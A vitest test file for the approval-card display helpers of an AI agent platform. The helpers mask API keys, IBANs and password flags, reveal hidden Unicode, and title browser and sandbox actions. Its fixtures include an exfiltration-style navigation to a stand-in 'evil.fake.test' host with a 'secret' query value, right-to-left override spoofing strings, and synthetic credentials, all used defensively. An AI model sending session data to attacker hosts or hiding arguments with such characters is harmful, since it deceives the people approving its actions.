import { AgentCardBrowserAction } from "@ocw/contracts";
import { describe, expect, it } from "vitest";
import { shownTarget } from "./kind";
import {
  approverText,
  argumentsDisplay,
  browserActionView,
  browserSummaryTitle,
  cardBrowserOf,
  humanizeKey,
  isSandboxExecAfterSignIn,
  maskForDisplay,
  NO_APPROVER,
  orderPreview,
  sandboxExecView,
  shortToolName,
  summaryTitle,
  toolCallTitle,
} from "./view";

/** Display helpers of a `tool.call` approval (07.5-07, UI-SPEC Surface 1 and 2, R7): pure, display only. */

const ANTHROPIC_KEY = `sk-ant-api03-${"Ab3_".repeat(10)}9f2c`;
const IBAN = "ES91 2100 0418 4502 0005 1332";

describe("preview order and labels (UI-SPEC R7)", () => {
  it("orders target, recipient, amount, subject and body keys first, then the rest alphabetically", () => {
    const p = orderPreview({
      note: "Invoice for September",
      amount: 1250,
      to: "billing@globex.example",
      customer: "Globex S.L.",
      currency: "EUR",
      due_date: "2026-11-01",
      subject: "September",
    });
    expect(p.fields.map((f) => f.key)).toEqual([
      "to",
      "amount",
      "currency",
      "subject",
      "note",
      "customer",
      "due_date",
    ]);
    expect(p.fields.map((f) => f.label)).toEqual([
      "To",
      "Amount",
      "Currency",
      "Subject",
      "Note",
      "Customer",
      "Due date",
    ]);
    expect(p.fields.find((f) => f.key === "amount")?.value).toBe("1250");
    expect(p.truncated).toBe(false);
    expect(p.notices).toEqual({ hiddenCharacters: false, maskedSecret: false });
  });

  it("the same keys in any input order give the same preview", () => {
    const a = orderPreview({ b: 1, a: 2, to: "x" });
    const b = orderPreview({ to: "x", a: 2, b: 1 });
    expect(a).toEqual(b);
  });

  it("humanizes snake_case, camelCase and kebab-case keys", () => {
    expect(humanizeKey("due_date")).toBe("Due date");
    expect(humanizeKey("dueDate")).toBe("Due date");
    expect(humanizeKey("line-items")).toBe("Line items");
    expect(humanizeKey("___")).toBe("Value");
    expect(humanizeKey("x".repeat(100))).toHaveLength(60);
  });

  it("shows a nested object or array as one compact canonical value", () => {
    const p = orderPreview({ items: [1, { b: 2, a: "x" }], meta: { z: true, y: null } });
    expect(p.fields).toEqual([
      { key: "items", label: "Items", value: '[1,{"a":"x","b":2}]' },
      { key: "meta", label: "Meta", value: '{"y":null,"z":true}' },
    ]);
  });

  it("cuts a value of 600 characters to 500 and marks the preview truncated", () => {
    const p = orderPreview({ body: "a".repeat(600) });
    expect(p.fields[0]?.value).toHaveLength(500);
    expect(p.fields[0]?.value.endsWith("…")).toBe(true);
    expect(p.truncated).toBe(true);
  });

  it("an empty key still gives a valid field", () => {
    expect(orderPreview({ "": "v" }).fields).toEqual([{ key: "(empty key)", label: "Value", value: "v" }]);
  });

  it("13 keys: 12 fields and truncated", () => {
    const args = Object.fromEntries(
      Array.from({ length: 13 }, (_, i) => [`k${String(i).padStart(2, "0")}`, i]),
    );
    const p = orderPreview(args);
    expect(p.fields).toHaveLength(12);
    expect(p.truncated).toBe(true);
    expect(orderPreview(Object.fromEntries(Object.entries(args).slice(0, 12))).truncated).toBe(false);
  });
});

describe("masking and revealed characters (display only)", () => {
  it("masks an API key and an IBAN by their ends and says so", () => {
    const p = orderPreview({ key: ANTHROPIC_KEY, iban: IBAN });
    expect(p.fields.find((f) => f.key === "key")?.value).toBe("sk-ant-•••• 9f2c");
    expect(p.fields.find((f) => f.key === "iban")?.value).toBe("ES91 •••• 1332");
    expect(p.notices.maskedSecret).toBe(true);
  });

  it("masks inside longer text and leaves ordinary text alone", () => {
    expect(maskForDisplay(`pay to ${IBAN} today`)).toEqual({
      text: "pay to ES91 •••• 1332 today",
      masked: true,
    });
    expect(maskForDisplay("Invoice for September, 3 plants.")).toEqual({
      text: "Invoice for September, 3 plants.",
      masked: false,
    });
  });

  it('reveals "pay\\u202Eto" as pay⟨U+202E⟩to and flags hidden characters', () => {
    const p = orderPreview({ to: "pay‮to" });
    expect(p.fields[0]?.value).toBe("pay⟨U+202E⟩to");
    expect(p.notices.hiddenCharacters).toBe(true);
  });

  it("a hidden character in a key is revealed in its label and flagged", () => {
    const p = orderPreview({ "to​": "x" });
    expect(p.fields[0]?.label).toBe("To⟨U+200B⟩");
    expect(p.notices.hiddenCharacters).toBe(true);
  });

  it("all arguments: pretty canonical JSON, masked and revealed", () => {
    const d = argumentsDisplay({ to: "a‮b", key: ANTHROPIC_KEY, n: 1 });
    expect(d.json).toBe('{\n  "key": "sk-ant-•••• 9f2c",\n  "n": 1,\n  "to": "a⟨U+202E⟩b"\n}');
    expect(d).toMatchObject({ masked: true, hidden: true, cut: false });
  });

  it("all arguments too wide for the view fall back to the compact form, then are cut", () => {
    let deep: unknown = Array.from({ length: 2000 }, () => 1);
    for (let i = 0; i < 30; i++) deep = [deep];
    const compact = argumentsDisplay({ a: deep });
    expect(compact.json.includes("\n")).toBe(false);
    expect(compact.cut).toBe(false);
    const hidden = argumentsDisplay({ a: "​".repeat(10_000) });
    expect(hidden.json.length).toBeLessThanOrEqual(65_536);
    expect(hidden.cut).toBe(true);
  });
});

describe("titles and approver labels (UI-SPEC Copywriting › Action card)", () => {
  it("names the action by its source", () => {
    expect(
      toolCallTitle({ tool: "m1a2b3c4d__create_invoice", sourceKind: "mcp", sourceName: "Acme CRM" }),
    ).toBe("Run create_invoice on Acme CRM");
    expect(
      toolCallTitle({ tool: "m1a2b3c4d__create_invoice", sourceKind: "connector", sourceName: "Acme CRM" }),
    ).toBe("Run create_invoice on Acme CRM");
    expect(
      toolCallTitle({
        tool: "ocw_http_request",
        sourceKind: "http",
        sourceName: "Web request",
        method: "post",
        host: "erp.acme.example",
      }),
    ).toBe("Send POST to erp.acme.example");
    expect(toolCallTitle({ tool: "acme_tool", sourceKind: "plugin", sourceName: "@acme/tools" })).toBe(
      "Run acme_tool",
    );
    expect(shortToolName("m1a2b3c4d__")).toBe("m1a2b3c4d__");
  });

  it("the summary title names the bot, the tool and the person, never a value", () => {
    expect(summaryTitle({ botName: "Keeper", tool: "m1a2b3c4d__write_note", requesterName: "Sam Lee" })).toBe(
      "Keeper wants to run write_note for Sam Lee",
    );
  });

  it("says who it waits for, for every approver kind", () => {
    const base = { requesterName: "Sam Lee", names: [] as string[], unitName: null };
    expect(approverText({ ...base, approverKind: "requester" })).toBe("Waiting for Sam Lee to approve");
    expect(approverText({ ...base, approverKind: null })).toBe("Waiting for Sam Lee to approve");
    expect(approverText({ ...base, approverKind: "users", names: ["Marta Gil"] })).toBe(
      "Waiting for Marta Gil",
    );
    expect(approverText({ ...base, approverKind: "users", names: ["Marta Gil", "Luis Mora"] })).toBe(
      "Waiting for Marta Gil or Luis Mora",
    );
    expect(
      approverText({ ...base, approverKind: "users", names: ["Marta Gil", "Luis Mora", "Dana Cole"] }),
    ).toBe("Waiting for Marta Gil or 2 others");
    expect(approverText({ ...base, approverKind: "users", names: [] })).toBe(NO_APPROVER);
    expect(approverText({ ...base, approverKind: "unit_leads", unitName: "Sales" })).toBe(
      "Waiting for a lead of Sales",
    );
    expect(approverText({ ...base, approverKind: "admins" })).toBe("Waiting for an admin");
  });
});

describe("the target a person reads (WINDOWS #221)", () => {
  it("hides the internal server name an MCP or connector tool carries as its prefix; keeps a real host", () => {
    expect(shownTarget({ target: "mc4866abe", tool: "mc4866abe__write_note" })).toBeNull();
    expect(shownTarget({ target: "acme", tool: "acme__create_record" })).toBeNull();
    expect(shownTarget({ target: "api.acme.example", tool: "ocw_http_request" })).toBe("api.acme.example");
    expect(shownTarget({ target: null, tool: "notes_save" })).toBeNull();
  });
});

describe("browser actions (07.8-14, UI-SPEC Surface 6, R8, D-13)", () => {
  const click = {
    contextId: "5b3a1f0e-7d2c-4c1a-9a55-1f7b2b0f3c11",
    action: "click",
    ref: "r7",
    element: { role: "button", name: "Place order" },
    host: "shop.fake.test",
    secure: true,
    signedIn: true,
    sessionSite: "shop.fake.test",
  };

  it("a click: title, Action, Element, Page and Session (the requester reads “you”)", () => {
    const v = browserActionView(click);
    expect(v.title).toBe("Click “Place order” on shop.fake.test");
    expect(v.fields).toEqual([
      { label: "Action", value: "Click" },
      { label: "Element", value: "button “Place order”" },
      { label: "Page", value: "shop.fake.test" },
      { label: "Session", value: "Signed in as you" },
    ]);
    expect(v.browser).toEqual({
      action: "click",
      element: { role: "button", name: "Place order" },
      host: "shop.fake.test",
      secure: true,
      signedIn: true,
      sessionSite: "shop.fake.test",
      value: null,
      option: null,
    });
  });

  it("the summary names the requester and shows no element or value", () => {
    const v = browserActionView(click, { summary: true, requesterName: "Sam Lee" });
    expect(v.fields.find((f) => f.label === "Session")?.value).toBe("Signed in as Sam Lee");
    expect(v.fields.some((f) => f.label === "Element")).toBe(false);
    expect(v.browser.element).toBeNull();
    expect(browserSummaryTitle({ botName: "Scout", requesterName: "Sam Lee", args: click })).toBe(
      "Scout wants to click on shop.fake.test for Sam Lee",
    );
  });

  it("a type action shows what the bot will type, masked by the server", () => {
    const key = `sk-ant-api03-${"Ab3_".repeat(10)}9f2c`;
    const v = browserActionView({
      ...click,
      action: "type",
      element: { role: "textbox", name: "Address" },
      value: `Calle Mayor 3 ${key}`,
    });
    expect(v.title).toBe("Type into “Address” on shop.fake.test");
    const value = v.fields.find((f) => f.label === "Value")?.value ?? "";
    expect(value).toContain("Calle Mayor 3");
    expect(value).not.toContain(key);
    expect(v.browser.value).toBe(value);
    expect(
      browserActionView({ ...click, action: "type", value: "x" }, { summary: true }).browser.value,
    ).toBeNull();
  });

  it("choose and press titles", () => {
    expect(
      browserActionView({
        ...click,
        action: "select",
        element: { role: "combobox", name: "Size" },
        option: "XL",
      }).title,
    ).toBe("Choose “XL” in “Size” on shop.fake.test");
    expect(browserActionView({ ...click, action: "press", element: null, key: "Enter" }).title).toBe(
      "Press Enter on shop.fake.test",
    );
  });

  it("D-13: an open to another host while signed in reads “Open {host}” with the session's site", () => {
    const open = browserActionView({
      action: "open",
      url: "https://evil.fake.test/x?d=secret",
      host: "evil.fake.test",
      secure: true,
      sessionSite: "panel.fake.test",
    });
    expect(open.title).toBe("Open evil.fake.test");
    expect(open.browser).toMatchObject({
      action: "open",
      host: "evil.fake.test",
      sessionSite: "panel.fake.test",
    });
    expect(open.fields).toContainEqual({ label: "Page", value: "evil.fake.test" });
    expect(open.fields).toContainEqual({ label: "Session", value: "Signed in as you on panel.fake.test" });
    expect(JSON.stringify(open)).not.toContain("d=secret");
    // An act whose navigation the site lock stopped is approved as an open of the host it would reach.
    const blocked = browserActionView({
      ...click,
      element: { role: "link", name: "Export" },
      navigateTo: "evil.fake.test",
    });
    expect(blocked.title).toBe("Open evil.fake.test");
    expect(blocked.browser).toMatchObject({
      action: "open",
      host: "evil.fake.test",
      sessionSite: "shop.fake.test",
    });
  });

  it("page text in an element name is shown as plain text, one line, cut", () => {
    const v = browserActionView({
      ...click,
      element: { role: "button", name: `Pay\n\u200bnow ${"x".repeat(300)}` },
    });
    const el = v.fields.find((f) => f.label === "Element")?.value ?? "";
    expect(el).not.toContain("\n");
    expect(el).toContain("⟨U+200B⟩");
    expect(v.title.length).toBeLessThanOrEqual(200);
  });
});

describe("the card's page of a browser action (07.8-20, R8, T-07.8-20-03)", () => {
  it("action, host, scheme and session only: never the element, a typed value or an option", () => {
    const args = {
      contextId: "5b3a1f0e-7d2c-4c1a-9a55-1f7b2b0f3c11",
      action: "type",
      ref: "r2",
      element: { role: "textbox", name: "Email" },
      host: "intranet.fake.test",
      secure: false,
      signedIn: true,
      sessionSite: "intranet.fake.test",
      value: "sam.lee@shop.example",
    };
    const page = cardBrowserOf(args);
    expect(page).toEqual({ action: "type", host: "intranet.fake.test", secure: false, signedIn: true });
    expect(AgentCardBrowserAction.strict().parse(page)).toEqual(page);
    expect(JSON.stringify(page)).not.toContain("Email");
    expect(JSON.stringify(page)).not.toContain("sam.lee");
  });
});

describe("a command with internet access after a member's sign-in (07.8-25, D-13, P-18)", () => {
  it("titles the action after the member and shows the command and its internet access", () => {
    const v = sandboxExecView(
      { argv: ["curl", "-s", "https://api.fake.test/report"], egress: "allowlist" },
      { requesterName: "Sam" },
    );
    expect(v.title).toBe("Run a command with internet access after using Sam's sign-in");
    expect(v.fields).toEqual([
      { label: "Command", value: "curl -s https://api.fake.test/report" },
      { label: "Internet access", value: "Allowed hosts only" },
    ]);
    expect(sandboxExecView({ argv: ["true"], egress: "public" }).fields[1]).toEqual({
      label: "Internet access",
      value: "Any public host",
    });
  });

  it("masks a password flag and secret-looking values, quotes words with spaces, and shows the first 200 characters", () => {
    const v = sandboxExecView({
      argv: ["deploy", "--password=x", `--key=${ANTHROPIC_KEY}`, "DB_PASSWORD=hunter2hunter2", "two words"],
      egress: "public",
    });
    const command = v.fields[0]?.value ?? "";
    expect(command).toContain("--password=••••");
    expect(command).not.toContain("--password=x");
    expect(command).not.toContain(ANTHROPIC_KEY);
    expect(command).not.toContain("hunter2hunter2");
    expect(command).toContain("'two words'");
    const long =
      sandboxExecView({ argv: ["echo", "a".repeat(400)], egress: "allowlist" }).fields[0]?.value ?? "";
    expect(long).toHaveLength(200);
    expect(long.endsWith("…")).toBe(true);
  });

  it("is used only for an exec that D-13 sent for approval (the egress mode is in its arguments)", () => {
    expect(isSandboxExecAfterSignIn("ocw_sandbox_exec", { argv: ["ls"], egress: "allowlist" })).toBe(true);
    expect(isSandboxExecAfterSignIn("ocw_sandbox_exec", { argv: ["ls"], egress: "public" })).toBe(true);
    expect(isSandboxExecAfterSignIn("ocw_sandbox_exec", { argv: ["ls"] })).toBe(false);
    expect(isSandboxExecAfterSignIn("ocw_sandbox_exec", { argv: ["ls"], egress: "off" })).toBe(false);
    expect(isSandboxExecAfterSignIn("ocw_sandbox_write", { egress: "public" })).toBe(false);
  });
});

describe("secret flags in any approval's arguments (07.8-28, WINDOWS #294)", () => {
  const ARGS = {
    argv: ["deploy", "--password=hunter2", "-p", "--api-key=abc123", "--auth-token=t0k3n", "--name=prod"],
  };

  it("the generic preview of a plain 07.5 exec masks `--password=x` style flags like the D-13 view", () => {
    const p = orderPreview(ARGS);
    const shown = p.fields[0]?.value ?? "";
    expect(shown).toContain("--password=••••");
    expect(shown).toContain("--api-key=••••");
    expect(shown).toContain("--auth-token=••••");
    expect(shown).toContain("--name=prod");
    for (const secret of ["hunter2", "abc123", "t0k3n"]) expect(shown).not.toContain(secret);
    expect(p.notices.maskedSecret).toBe(true);
  });

  it("the review's All arguments masks them too; a value that only mentions a flag in prose is left alone", () => {
    const d = argumentsDisplay(ARGS);
    for (const secret of ["hunter2", "abc123", "t0k3n"]) expect(d.json).not.toContain(secret);
    expect(d.masked).toBe(true);
    const prose = orderPreview({ note: "use --password=hunter2 later" });
    expect(prose.fields[0]?.value).toBe("use --password=hunter2 later");
    expect(orderPreview({ argv: ["ls", "-la"] }).notices.maskedSecret).toBe(false);
  });
});
